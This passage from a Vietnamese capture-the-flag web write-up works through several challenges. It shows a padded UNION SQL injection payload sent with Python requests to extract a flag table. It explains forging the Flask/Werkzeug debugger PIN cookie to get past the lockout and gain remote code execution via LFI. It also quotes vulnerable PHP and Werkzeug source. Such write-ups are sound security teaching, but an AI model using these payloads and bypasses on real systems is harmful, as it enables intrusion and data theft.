sys.x$ps_schema_table_statistics_io where table_schema=database()'</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></code></pre>\n<p><img src=\"https://i.imgur.com/xKdXXBS.jpg\" alt=\"\"></p>\n<p>Table name: <code>Th1z_Fack1n_Fl4444g_Tabl3</code></p>\n<h3 id=\"get-flag-without-knowing-column-name\">Get flag without knowing column name <a class=\"direct-link\" href=\"#get-flag-without-knowing-column-name\">#</a></h3>\n<p>C√°ch n√†y ƒë√£ ƒë∆∞·ª£c anh @tsug0d m√¥ t·∫£ c·ª±c k√¨ chi ti·∫øt v√† d·ªÖ hi·ªÉu trong <a href=\"https://tsublogs.wordpress.com/2017/06/07/pentest-qa-cung-tsu-5-sql-injection-without-information_schema/\">blog</a> c·ªßa anh n√™n m√¨nh kh√¥ng d√†i d√≤ng n·ªØa. Get flag th√¥i!</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\">res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://45.77.240.178:8002/index.php'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'5 union/*'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">1000000</span> <span class=\"token operator\">+</span> <span class=\"token string\">'*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x'</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></span></code></pre>\n<p><img src=\"https://i.imgur.com/iAgHzHz.jpg\" alt=\"\"></p>\n<h3 id=\"another-way-from-the-author\">Another way from the author <a class=\"direct-link\" href=\"#another-way-from-the-author\">#</a></h3>\n<p><img src=\"https://i.imgur.com/PVK8WBT.jpg\" alt=\"\"><br>\nüéâüéâüéâ</p>\n<h2 id=\"the-prophet\">The Prophet <a class=\"direct-link\" href=\"#the-prophet\">#</a></h2>\n<pre><code>Wohoo, wanna hear some oracle?\n</code></pre>\n<p>B√†i n√†y ch·ªâ c√≥ 1 ch·ª©c nƒÉng c∆° b·∫£n l√† ƒë·ªçc c√°c file text c√≥ t√™n t·ª´ 1 - 5. Khi ta th·ª≠ file <code>6.txt</code>, trang xu·∫•t hi·ªán giao di·ªán th√¥ng b√°o l·ªói c·ªßa Flask, ch·ª©ng t·ªè debug mode ƒëang ƒë∆∞·ª£c enabled.<br>\nTrong giao di·ªán b√°o l·ªói, ch√∫ng ta c√≥ th·ªÉ ƒë·ªçc 1 ph·∫ßn source code ƒë√£ b·ªã disclosed:</p>\n<p><img src=\"https://i.imgur.com/WvzEivs.jpg\" alt=\"\"></p>\n<p>Ta d·ªÖ d√†ng th·∫•y ƒë∆∞·ª£c l·ªói Local File Inclusion (LFI) trong ƒëo·∫°n code x·ª≠ l√≠ ƒë·ªçc file n√†y. Bi·∫øn <code>filename</code> ƒë∆∞·ª£c truy·ªÅn th·∫≥ng ƒë·∫øn h√†m <code>open()</code> v√† n·ªôi dung ƒë∆∞·ª£c ƒë∆∞a ra ngo√†i th√¥ng qua h√†m <code>render_template()</code>.</p>\n<p>Ngay l√∫c n√†y, m√¨nh nh·∫≠n ra r·∫±ng vi·ªác ch√∫ng ta c√≥ l·ªói LFI s·∫Ω d·∫´n ƒë·∫øn vi·ªác c√≥ th·ªÉ <a href=\"https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\">generate</a> ƒë∆∞·ª£c debugger PIN code, sau ƒë√≥ s·ª≠ d·ª•ng ch·ª©c nƒÉng Interactive shell ƒë∆∞·ª£c t√≠ch h·ª£p trong giao di·ªán l·ªói c·ªßa Flask ƒë·ªÉ c√≥ th·ªÉ leverage l√™n RCE.</p>\n<p>Sau khi l√†m theo b√†i h∆∞·ªõng d·∫´n generate PIN code v√† ƒë√£ c√≥ ƒë∆∞·ª£c PIN, gi·ªù ch·ªâ vi·ªác submit PIN v√† RCE th√¥i, nh∆∞ng ƒë·ªùi kh√¥ng nh∆∞ m∆° v√† cu·ªôc s·ªëng kh√¥ng d·ªÖ th·ªü...</p>\n<p><img src=\"https://i.imgur.com/lP07KrD.jpg\" alt=\"\"></p>\n<p>Ok, t·ª± trong ƒë·∫ßu nghƒ© ch·∫Øc ƒë√¢y c≈©ng l√† √Ω c·ªßa t√°c gi·∫£ th√¥i, ch·∫Øc c√≥ ch·ªó n√†o ƒë√¢u ƒë√≥ trong ph·∫ßn x·ª≠ l√≠ nh·∫≠p PIN n√†y c√≥ th·ªÉ v∆∞·ª£t ƒë∆∞·ª£c, let check it out. üßê</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token comment\"># https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">hash_pin</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>pin<span class=\"token punctuation\">,</span> text_type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        pin <span class=\"token operator\">=</span> pin<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"replace\"</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>pin <span class=\"token operator\">+</span> <span class=\"token string\">b\"shittysalt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">DebuggedApplication</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">def</span> <span class=\"token function\">check_pin_trust</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> environ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br>        <span class=\"token triple-quoted-string string\">\"\"\"Checks if the request passed the pin test.  This returns `True` if the<br><span class=\"highlight-line\">        request is trusted on a pin/cookie basis and returns `False` if not.</span><br><span class=\"highlight-line\">        Additionally if the cookie's stored pin hash is wrong it will return</span><br><span class=\"highlight-line\">        `None` so that appropriate action can be taken.</span><br>        \"\"\"</span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>pin <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\">        val <span class=\"token operator\">=</span> parse_cookie<span class=\"token punctuation\">(</span>environ<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin_cookie_name<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> val <span class=\"token keyword\">or</span> <span class=\"token string\">\"|\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> val<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        ts<span class=\"token punctuation\">,</span> pin_hash <span class=\"token operator\">=</span> val<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"|\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ts<span class=\"token punctuation\">.</span>isdigit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> pin_hash <span class=\"token operator\">!=</span> hash_pin<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> PIN_TIME<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>ts<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">def</span> <span class=\"token function\">pin_auth</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">        <span class=\"token triple-quoted-string string\">\"\"\"Authenticates with the pin.\"\"\"</span></span><br><span class=\"highlight-line\">        exhausted <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        auth <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        trust <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>check_pin_trust<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># If the trust return value is `None` it means that the cookie is</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># set but the stored pin hash value is bad.  This means that the</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># pin was changed.  In this case we count a bad auth and unset the</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># cookie.  This way it becomes harder to guess the cookie name</span></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># instead of the pin as we still count up failures.</span></span><br><span class=\"highlight-line\">        bad_cookie <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> trust <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            self<span class=\"token punctuation\">.</span>_fail_pin_auth<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">            bad_cookie <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># If we're trusted, we're authenticated.</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">elif</span> trust<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            auth <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># If we failed too many times, then we're locked out.</span></span><br><mark class=\"highlight-line highlight-line-active\">        <span class=\"token keyword\">elif</span> self<span class=\"token punctuation\">.</span>_failed_pin_auth <span class=\"token operator\">></span> <span class=\"token number\">10</span><span class=\"token punctuation\">:</span></mark><br><mark class=\"highlight-line highlight-line-active\">            exhausted <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></mark><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        <span class=\"token comment\"># Otherwise go through pin based authentication</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            entered_pin <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"pin\"</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">if</span> entered_pin<span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> self<span class=\"token punctuation\">.</span>pin<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"-\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">                self<span class=\"token punctuation\">.</span>_failed_pin_auth <span class=\"token operator\">=</span> <span class=\"token number\">0</span></span><br><span class=\"highlight-line\">                auth <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">                self<span class=\"token punctuation\">.</span>_fail_pin_auth<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">        rv <span class=\"token operator\">=</span> Response<span class=\"token punctuation\">(</span></span><br><span class=\"highlight-line\">            json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"auth\"</span><span class=\"token punctuation\">:</span> auth<span class=\"token punctuation\">,</span> <span class=\"token string\">\"exhausted\"</span><span class=\"token punctuation\">:</span> exhausted<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">            mimetype<span class=\"token operator\">=</span><span class=\"token string\">\"application/json\"</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> auth<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            rv<span class=\"token punctuation\">.</span>set_cookie<span class=\"token punctuation\">(</span></span><br><span class=\"highlight-line\">                self<span class=\"token punctuation\">.</span>pin_cookie_name<span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">                <span class=\"token string\">\"%s|%s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> hash_pin<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">                httponly<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span></span><br><span class=\"highlight-line\">            <span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">elif</span> bad_cookie<span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">            rv<span class=\"token punctuation\">.</span>delete_cookie<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>pin_cookie_name<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">return</span> rv</span><br><span class=\"highlight-line\">    <span class=\"token comment\"># ...</span></span></code></pre>\n<p>Hai d√≤ng ƒë∆∞·ª£c highlight l√† c√¢u l·ªánh if ki·ªÉm tra ƒëi·ªÅu ki·ªán n·∫øu nh·∫≠p sai qu√° 10 l·∫ßn th√¨ <code>exhausted = True</code>, t·ª´ ƒë√≥ ta suy ra ƒë√£ c√≥ ng∆∞·ªùi submit sai PIN kho·∫£ng 7 - 8 l·∫ßn tr∆∞·ªõc ƒë√≥, ƒë·ªÉ ƒë·∫øn l∆∞·ª£t m√¨nh th√¨ sau khi th·ª≠ 2 - 3 m√£ PIN th√¨ n√≥ l√™n 10. üò§</p>\n<p>Ok, quay l·∫°i n√†o. V√¨ c√¢u ƒëi·ªÅu ki·ªán check nh·∫≠p sai n·∫±m trong nh√°nh <code>elif</code> n√™n ch·ªâ c·∫ßn 2 c√¢u ƒëi·ªÅu ki·ªán ·ªü tr√™n ƒë√∫ng th√¨ s·∫Ω kh√¥ng th·ª±c thi. Bi·∫øn <code>trust</code> ƒë∆∞·ª£c kh·ªüi t·∫°o v·ªõi value l√† return value c·ªßa h√†m <code>check_pin_trust()</code>, h√†m n√†y th·ª±c hi·ªán get v√† parse cookie, ki·ªÉm tra PIN hash trong cookie c√≥ ƒë√∫ng v·ªõi PIN hash tr√™n server hay kh√¥ng, PIN expired time c√≥ h·∫øt h·∫°n hay ch∆∞a.</p>\n<p>V√¨ ch√∫ng ta c√≥ th·ªÉ control ƒë∆∞·ª£c cookie n√™n ta c√≥ th·ªÉ t√πy bi·∫øn ƒë∆∞·ª£c cookie ƒë·ªÉ v∆∞·ª£t qua ƒë∆∞·ª£c vi·ªác check exhausted. M√¨nh ƒë√£ c√≥ quy·ªÅn ch·∫°y Python code tr√™n interactive shell r·ªìi, t√¨m v√† ƒë·ªçc flag r·∫•t d·ªÖ d√†ng.</p>\n<h3 id=\"author-n%C3%B3i-g%C3%AC%3F\">Author n√≥i g√¨? <a class=\"direct-link\" href=\"#author-n%C3%B3i-g%C3%AC%3F\">#</a></h3>\n<p>Ok, gi·∫£i xong inbox author th√¨ ·∫£nh b·∫£o ch·ªâ c·∫ßn generate PIN code l√† xong r·ªìi RCE l·∫•y flag th√¥i, t·∫°i l√∫c ƒë√≥ setup c√≥ v·∫•n ƒë·ªÅ n√™n m·ªõi b·ªã exhausted. üò§</p>\n<h2 id=\"meepwntube2050\">MeePwnTube2050 <a class=\"direct-link\" href=\"#meepwntube2050\">#</a></h2>\n<p><img src=\"https://i.imgur.com/PtWQV2F.jpg\" alt=\"\"></p>\n<pre><code>Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view\n</code></pre>\n<p>B√†i n√†y m√¨nh stuck ƒë·∫øn ng√†y h√¥m sau m·ªõi nghƒ© ƒë∆∞·ª£c h∆∞·ªõng üòÖ</p>\n<p>V√¨ m√¨nh ng√¢m ƒëi ng√¢m l·∫°i source code nhi·ªÅu l·∫ßn ƒë·ªÉ ch·∫Øc ch·∫Øn r·∫±ng kh√¥ng c√≥ 1 l·ªói n√†o c√≥ th·ªÉ x·∫£y ra, v√† ƒë·∫øn khi m√¨nh ch·ª£t ƒë·ªÉ √Ω 1 chi ti·∫øt nh·ªè trong search.php:</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"><span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"dbconnect.php\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token variable\">$_IP</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'search'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_IP</span> <span class=\"token operator\">===</span> <span class=\"token double-quoted-string string\">\"45.76.148.212\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token comment\">//local only homie</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'search'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$_search</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$admin_conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Execquery</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$admin_conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT id,Name FROM search WHERE Name LIKE '%<span class=\"token interpolation\"><span class=\"token variable\">$_search</span></span>%' LIMIT 8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$Result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Execquery</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;b>&lt;p style='font-size:20px; color:green'>\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'Name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"&lt;/p>&lt;/b>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;iframe src='video\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\".php' width='1200' height='300'>&lt;/iframe>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;/center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'search'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$_search</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token variable\">$Execquery</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT id,Name FROM search WHERE Name LIKE '%<span class=\"token interpolation\"><span class=\"token variable\">$_search</span></span>%' LIMIT 8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$Result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Execquery</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;b>&lt;p style='font-size:20px; color:green'>\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'Name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\"&lt;/p>&lt;/b>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;iframe src='video\"</span><span class=\"token punctuation\">.</span><span class=\"token variable\">$Result</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token double-quoted-string string\">\".php' width='1200' height='300'>&lt;/iframe>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;/center>\"</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"></span><br><span class=\"token delimiter important\">?></span></span></code></pre>\n<p>T·∫°i d√≤ng 10 n·∫øu IP l√† <code>45.76.148.212</code> (c≈©ng l√† IP c·ªßa bot) th√¨ n√≥ s·∫Ω l·∫•y gi√° tr·ªã t·ª´ <code>DB_ADMIN</code> ch·ª© kh√¥ng ph·∫£i l·∫•y gi√° tr·ªã t·ª´ DB th∆∞·ªùng. T·ª´ ƒë√≥ l√†m m√¨nh nghƒ© ngay t·ªõi b√†i <a href=\"https://ctftime.org/task/8659\">secret note keeper</a> trong gi·∫£i <a href=\"https://ctftime.org/event/781\">Facebook CTF 2019</a> m√† anh @ducnt ƒë√£ gi·∫£i v√† vi·∫øt <a href=\"http://www.ducnt.net/2019/06/xs-search-secret-note-keeper-facebook.html\">writeup</a> tr∆∞·ªõc ƒë√≥.</p>\n<p>Ph·∫ßn c√≤n l·∫°i ƒë·ªÉ c√°c b·∫°n tr·∫£ l·ªùi... üò™</p>\n<h2 id=\"hellovietnamv2\">HelloVietNamv2 <a class=\"direct-link\" href=\"#hellovietnamv2\">#</a></h2>\n<p><a href=\"https://www.youtube.com/watch?v=ZqjhmdRgXMw\">https://www.youtube.com/watch?v=ZqjhmdRgXMw</a></p>\n<pre><code>Source: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view\n</code></pre>\n<p>B√†i n√†y c≈©ng l√† 1 b√†i b·ªã setup l·ªói, d·∫´n ƒë·∫øn nhi·ªÅu team trong ƒë√≥ c√≥ m√¨nh gi·∫£i theo h∆∞·ªõng unintended (Command Injection) thay v√¨ intended (Memcached Injection). Trong ph·∫ßn n√†y m√¨nh s·∫Ω ch·ªâ n√≥i v·ªÅ <a href=\"https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf\">c√°ch intended c·ªßa t√°c gi·∫£</a>.</p>\n<h3 id=\"where's-the-real-bug-in-the-source-code%3F\">Where's the real bug in the source code? <a class=\"direct-link\" href=\"#where's-the-real-bug-in-the-source-code%3F\">#</a></h3>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token comment\"># ...</span></span><br><span class=\"highlight-line\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/loadexternalvideo'</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">def</span> <span class=\"token function\">loadexternalvideo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> 